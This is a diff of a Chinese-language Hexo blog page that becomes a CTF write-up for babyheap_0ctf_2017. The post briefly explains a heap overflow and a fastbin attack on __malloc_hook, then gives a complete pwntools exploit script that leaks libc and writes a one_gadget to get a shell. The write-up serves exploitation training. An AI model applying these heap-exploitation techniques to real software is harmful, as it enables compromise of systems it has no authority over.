@@ -6,17 +6,33 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2024/3 | Hexo</title>
+  <title>babyheap_0ctf_2017 | Hexo</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2024/03/index.html">
+  <meta name="description" content="保护全开 malloc,add都整得挺抽象的，但都大同小异。这道题还是挺有难度的有个填充的时候的size可以大于自己申请的，有个堆溢出漏洞。  尝试改下个堆的size，再释放，再malloc，会报错，这个方法不行。  改掉了bin指针        堆2是指向free_chunk的，填充堆2也就是在fast_bin的指针上写上malloc_hook上面的地址，溢出堆3也能改bin指针。这里的地址有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="babyheap_0ctf_2017">
+<meta property="og:url" content="http://example.com/2024/03/13/babyheap-0ctf-2017/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="保护全开 malloc,add都整得挺抽象的，但都大同小异。这道题还是挺有难度的有个填充的时候的size可以大于自己申请的，有个堆溢出漏洞。  尝试改下个堆的size，再释放，再malloc，会报错，这个方法不行。  改掉了bin指针        堆2是指向free_chunk的，填充堆2也就是在fast_bin的指针上写上malloc_hook上面的地址，溢出堆3也能改bin指针。这里的地址有">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/12/cnbtX.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/12/cHClH.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/12/cHpbm.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/12/cH61T.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/12/cHgnO.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/12/cHsn2.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/12/cHcT9.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/12/cHtoH.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/12/cHjys.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/12/cHymu.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/13/cf7Ou.png">
+<meta property="article:published_time" content="2024-03-13T11:11:48.000Z">
+<meta property="article:modified_time" content="2024-03-14T06:27:37.456Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i0.imgs.ovh/2024/03/12/cnbtX.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -199,346 +215,243 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-babyheap-0ctf-2017" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
   
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2024" class="archive-year">2024</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
+    <h1 class="article-title" itemprop="name">
+      babyheap_0ctf_2017
+    </h1>
+  
+
+
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
 <a href="/2024/03/13/babyheap-0ctf-2017/" class="archive-article-date">
         <time datetime="2024-03-13T11:11:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-13</time>
 </a>
 
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">475字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">2分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>保护全开</p>
+<h5 id="malloc-add都整得挺抽象的，但都大同小异。这道题还是挺有难度的"><a href="#malloc-add都整得挺抽象的，但都大同小异。这道题还是挺有难度的" class="headerlink" title="malloc,add都整得挺抽象的，但都大同小异。这道题还是挺有难度的"></a>malloc,add都整得挺抽象的，但都大同小异。这道题还是挺有难度的</h5><p>有个填充的时候的size可以大于自己申请的，有个堆溢出漏洞。</p>
+<p><img src="https://i0.imgs.ovh/2024/03/12/cnbtX.png" alt="image-20240313194053956"></p>
+<p>尝试改下个堆的size，再释放，再malloc，会报错，这个方法不行。</p>
+<p><img src="https://i0.imgs.ovh/2024/03/12/cHClH.png" alt="image-20240313202940866"></p>
+<p>改掉了bin指针</p>
+<p><img src="https://i0.imgs.ovh/2024/03/12/cHpbm.png" alt="image-20240313205043694"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/12/cH61T.png" alt="image-20240313205752854"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/12/cHgnO.png" alt="image-20240313221321740"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/12/cHsn2.png" alt="image-20240313212014082"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/12/cHcT9.png" alt="image-20240313221044009"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/12/cHtoH.png" alt="image-20240313221647152"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/12/cHjys.png" alt="image-20240313222042253"></p>
+<h5 id="堆2是指向free-chunk的，填充堆2也就是在fast-bin的指针上写上malloc-hook上面的地址，溢出堆3也能改bin指针。这里的地址有一定的要求。"><a href="#堆2是指向free-chunk的，填充堆2也就是在fast-bin的指针上写上malloc-hook上面的地址，溢出堆3也能改bin指针。这里的地址有一定的要求。" class="headerlink" title="堆2是指向free_chunk的，填充堆2也就是在fast_bin的指针上写上malloc_hook上面的地址，溢出堆3也能改bin指针。这里的地址有一定的要求。"></a>堆2是指向free_chunk的，填充堆2也就是在fast_bin的指针上写上malloc_hook上面的地址，溢出堆3也能改bin指针。这里的地址有一定的要求。</h5><p><img src="https://i0.imgs.ovh/2024/03/12/cHymu.png" alt="image-20240313230951923"></p>
+<h5 id="在malloc-hook-0x23的地址上，dword-malloc-hook-0x23-0x8-这个地址的值是0x7f-满足0x70大小的fastbin的大小，所以malloc-hook-0x23这个地址可以当作fake-addr-再填充0x13字节到malloc-hook-写上one-gadget"><a href="#在malloc-hook-0x23的地址上，dword-malloc-hook-0x23-0x8-这个地址的值是0x7f-满足0x70大小的fastbin的大小，所以malloc-hook-0x23这个地址可以当作fake-addr-再填充0x13字节到malloc-hook-写上one-gadget" class="headerlink" title="在malloc_hook-0x23的地址上，dword(malloc_hook-0x23+0x8)这个地址的值是0x7f,满足0x70大小的fastbin的大小，所以malloc_hook-0x23这个地址可以当作fake_addr,再填充0x13字节到malloc_hook,写上one_gadget."></a>在malloc_hook-0x23的地址上，dword(malloc_hook-0x23+0x8)这个地址的值是0x7f,满足0x70大小的fastbin的大小，所以malloc_hook-0x23这个地址可以当作fake_addr,再填充0x13字节到malloc_hook,写上one_gadget.</h5><p><img src="https://i0.imgs.ovh/2024/03/13/cf7Ou.png" alt="image-20240314130240170"></p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node5.buuoj.cn&quot;,26041)</span></span><br><span class="line">p=process(<span class="string">&quot;./babyheap_0ctf_2017&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">full</span>(<span class="params">index,size,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#0 </span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x20</span>)+p8(<span class="number">0x80</span>)</span><br><span class="line">full(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">full(<span class="number">3</span>,<span class="number">0x20</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#2--&gt;4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">full(<span class="number">3</span>,<span class="number">0x20</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#防止合并</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">main_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">88</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_addr))</span><br><span class="line">base=main_addr-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">fake_addr=main_addr-<span class="number">0x10</span>-<span class="number">0x23</span></span><br><span class="line">full(<span class="number">2</span>,<span class="number">0x8</span>,p64(fake_addr))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">or</span></span><br><span class="line"><span class="string">payload=p64(0)*3+p64(0x71)+p64(fake_addr)</span></span><br><span class="line"><span class="string">full(3,0x28,payload)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#6</span></span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=base+one[<span class="number">1</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(one_gadget)</span><br><span class="line">full(<span class="number">6</span>,<span class="number">0x1b</span>,payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  
+                </div>
+              </span>
+            </span>
+          </span>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/13/babyheap-0ctf-2017/" target="_blank">babyheap_0ctf_2017</a>
-  
-    </h1>
-  
+      </a>
+    </div>
+    
 
-
-        <div class="article-info info-on-right">
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          John Doe
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="http://example.com/2024/03/13/babyheap-0ctf-2017/" title="babyheap_0ctf_2017" target="_blank">http://example.com/2024/03/13/babyheap-0ctf-2017/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
-          
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
 
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2024/03/13/babyheap-0ctf-2017/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/12/SWPUCTF-2019-login/" class="archive-article-date">
-        <time datetime="2024-03-12T12:48:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-12</time>
-</a>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/2024/03/12/SWPUCTF-2019-login/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">SWPUCTF_2019_login</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/12/SWPUCTF-2019-login/" target="_blank">SWPUCTF_2019_login</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#malloc-add%E9%83%BD%E6%95%B4%E5%BE%97%E6%8C%BA%E6%8A%BD%E8%B1%A1%E7%9A%84%EF%BC%8C%E4%BD%86%E9%83%BD%E5%A4%A7%E5%90%8C%E5%B0%8F%E5%BC%82%E3%80%82%E8%BF%99%E9%81%93%E9%A2%98%E8%BF%98%E6%98%AF%E6%8C%BA%E6%9C%89%E9%9A%BE%E5%BA%A6%E7%9A%84"><span class="toc-number">1.</span> <span class="toc-text">malloc,add都整得挺抽象的，但都大同小异。这道题还是挺有难度的</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A0%862%E6%98%AF%E6%8C%87%E5%90%91free-chunk%E7%9A%84%EF%BC%8C%E5%A1%AB%E5%85%85%E5%A0%862%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%9C%A8fast-bin%E7%9A%84%E6%8C%87%E9%92%88%E4%B8%8A%E5%86%99%E4%B8%8Amalloc-hook%E4%B8%8A%E9%9D%A2%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%8C%E6%BA%A2%E5%87%BA%E5%A0%863%E4%B9%9F%E8%83%BD%E6%94%B9bin%E6%8C%87%E9%92%88%E3%80%82%E8%BF%99%E9%87%8C%E7%9A%84%E5%9C%B0%E5%9D%80%E6%9C%89%E4%B8%80%E5%AE%9A%E7%9A%84%E8%A6%81%E6%B1%82%E3%80%82"><span class="toc-number">2.</span> <span class="toc-text">堆2是指向free_chunk的，填充堆2也就是在fast_bin的指针上写上malloc_hook上面的地址，溢出堆3也能改bin指针。这里的地址有一定的要求。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8malloc-hook-0x23%E7%9A%84%E5%9C%B0%E5%9D%80%E4%B8%8A%EF%BC%8Cdword-malloc-hook-0x23-0x8-%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%E7%9A%84%E5%80%BC%E6%98%AF0x7f-%E6%BB%A1%E8%B6%B30x70%E5%A4%A7%E5%B0%8F%E7%9A%84fastbin%E7%9A%84%E5%A4%A7%E5%B0%8F%EF%BC%8C%E6%89%80%E4%BB%A5malloc-hook-0x23%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%E5%8F%AF%E4%BB%A5%E5%BD%93%E4%BD%9Cfake-addr-%E5%86%8D%E5%A1%AB%E5%85%850x13%E5%AD%97%E8%8A%82%E5%88%B0malloc-hook-%E5%86%99%E4%B8%8Aone-gadget"><span class="toc-number">3.</span> <span class="toc-text">在malloc_hook-0x23的地址上，dword(malloc_hook-0x23+0x8)这个地址的值是0x7f,满足0x70大小的fastbin的大小，所以malloc_hook-0x23这个地址可以当作fake_addr,再填充0x13字节到malloc_hook,写上one_gadget.</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/11/STKOF/" class="archive-article-date">
-        <time datetime="2024-03-11T12:53:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-11</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/11/STKOF/" target="_blank">STKOF</a>
-  
-    </h1>
-  
+        
+    </div>
+</aside>
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/11/b00ks/" class="archive-article-date">
-        <time datetime="2024-03-11T06:17:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-11</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/11/b00ks/" target="_blank">b00ks</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/10/freenote-x64/" class="archive-article-date">
-        <time datetime="2024-03-10T12:50:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-10</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/10/freenote-x64/" target="_blank">freenote_x64</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/09/jiandan-pwn1/" class="archive-article-date">
-        <time datetime="2024-03-09T09:02:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-09</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/09/jiandan-pwn1/" target="_blank">jiandan_pwn1</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/08/mergeheap/" class="archive-article-date">
-        <time datetime="2024-03-08T12:47:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-08</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/08/mergeheap/" target="_blank">mergeheap</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/08/bbctf-2020-write/" class="archive-article-date">
-        <time datetime="2024-03-08T11:12:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-08</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/08/bbctf-2020-write/" target="_blank">bbctf_2020_write</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/08/ciscn-2019-c-5/" class="archive-article-date">
-        <time datetime="2024-03-08T04:49:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-08</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/08/ciscn-2019-c-5/" target="_blank">ciscn_2019_c_5</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/06/starctf-2019-girlfriend/" class="archive-article-date">
-        <time datetime="2024-03-06T13:48:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-06</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/06/starctf-2019-girlfriend/" target="_blank">starctf_2019_girlfriend</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/2024/03/page/2/">2</a><a class="extend next" rel="next" href="/archives/2024/03/page/2/">Next &amp;raquo;</a>
-    </nav>
-  
 
 
           </div>
@@ -579,8 +492,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
